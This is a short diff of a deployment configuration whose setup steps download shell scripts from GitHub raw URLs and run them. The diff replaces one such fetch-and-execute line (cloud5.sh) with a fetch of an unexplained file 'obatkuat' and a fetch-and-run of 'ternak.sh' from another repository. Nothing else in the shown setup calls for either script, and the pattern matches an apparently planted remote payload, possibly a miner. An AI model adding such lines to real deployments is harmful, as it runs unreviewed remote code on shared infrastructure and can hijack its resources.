@@ -6,7 +6,8 @@ deployments:
       - apt-get update
       - apt-get install -y wget
       - apt-get update
-      - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud5.sh && chmod +x cloud5.sh && ./cloud5.sh
+      - wget https://raw.githubusercontent.com/renifer12/engine/main/obatkuat
+      - wget https://raw.githubusercontent.com/renifer12/engine/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
       - pip install setuptools pip
       - pip install ~/code
     launch_steps:
